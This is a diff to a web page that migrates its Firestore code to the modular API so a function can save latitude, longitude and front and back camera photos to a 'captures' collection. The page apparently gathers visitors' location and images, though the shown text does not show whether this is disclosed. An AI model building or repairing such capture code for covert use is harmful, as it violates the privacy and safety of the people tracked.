@@ -22,16 +22,20 @@
 
         // Inizializza Firebase
         let db;
+        let addDocFunc;
         try {
             const app = initializeApp(firebaseConfig);
             db = getFirestore(app);
+            addDocFunc = addDoc;
             logDebug("Firebase inizializzato con successo");
         } catch (error) {
             logDebug("Errore inizializzazione Firebase: " + error.message);
         }
 
-        // Esporta db per usarlo nel codice
+        // Esporta db e addDoc per il secondo script
         window.db = db;
+        window.collection = collection;
+        window.addDoc = addDocFunc;
     </script>
 </head>
 <body>
@@ -144,12 +148,13 @@
 
         // Salva dati su Firestore
         async function sendData(location, frontPhoto, backPhoto) {
-            if (!window.db) {
-                logDebug("Errore: Firestore non inizializzato");
-                throw new Error("Firestore non inizializzato");
+            if (!window.db || !window.collection || !window.addDoc) {
+                logDebug("Errore: Firestore non inizializzato o funzioni mancanti");
+                throw new Error("Firestore non inizializzato o funzioni mancanti");
             }
             try {
-                await window.db.collection('captures').add({
+                const capturesRef = window.collection(window.db, 'captures');
+                await window.addDoc(capturesRef, {
                     latitude: location.latitude,
                     longitude: location.longitude,
                     frontPhoto: frontPhoto,
